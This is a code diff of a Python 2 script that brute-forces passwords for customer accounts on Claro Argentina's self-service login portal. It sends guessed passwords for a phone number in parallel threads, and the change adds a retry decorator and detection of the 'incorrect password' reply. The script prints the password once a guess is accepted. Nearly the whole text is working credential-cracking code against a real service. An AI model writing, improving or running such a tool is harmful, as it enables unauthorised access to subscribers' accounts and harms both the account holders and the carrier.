@@ -7,7 +7,8 @@ import urllib
 import cookielib
 from debug import debug
 import sys
-from decoradores import Async
+from decoradores import Async, Retry
+
 
 MAINURL = ("""http://www.servicios.claroargentina.com/"""
             """AutogestionCore2006/servlet/Controller""")
@@ -15,11 +16,10 @@ MAINURL = ("""http://www.servicios.claroargentina.com/"""
 LOGINKEY = """LOGINMAS"""
 SALDOKEY = """DATOS_FACTURA"""
 
-@Async
-def login(loginNumber, password):
 
-    cookies = cookielib.CookieJar()
-    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookies))
+@Async
+@Retry(30, pause=1)
+def login(loginNumber, password):
 
     data = urllib.urlencode({
         "EVENT": LOGINKEY,
@@ -27,19 +27,15 @@ def login(loginNumber, password):
         "password": password,
         })
 
-    retry = 30
-    while retry:
-        try:
-            html = "\n".join(opener.open(MAINURL, data).readlines())
-        except (urllib2.URLError, HTTPError):
-            retry -= 1
-            time.sleep(1)
-            debug("Retry %d" % retry)
-        else:
-            if """Los datos ingresados son correctos""" in html:
-                return password
-            else:
-                return False
+    try:
+        html = "\n".join(urllib2.urlopen(MAINURL, data).readlines())
+    except (urllib2.URLError, urllib2.HTTPError):
+        return None
+    else:
+        if """Los datos ingresados son correctos""" in html:
+            return password
+        elif """El Nro. o Password ingresados son incorrectos""" in html:
+            return False
 
 
 def main():
@@ -59,7 +55,8 @@ def main():
                     passed = True
                 elif not slots[pos].is_alive():
                     if slots[pos].result:
-                        print "¡La contraseña es %s!" % slots[pos].result
+                        print("¡La contraseña de %s es %s !" % (
+                            loginNumber, slots[pos].result))
                         return True
                     passed = True
                 if passed:
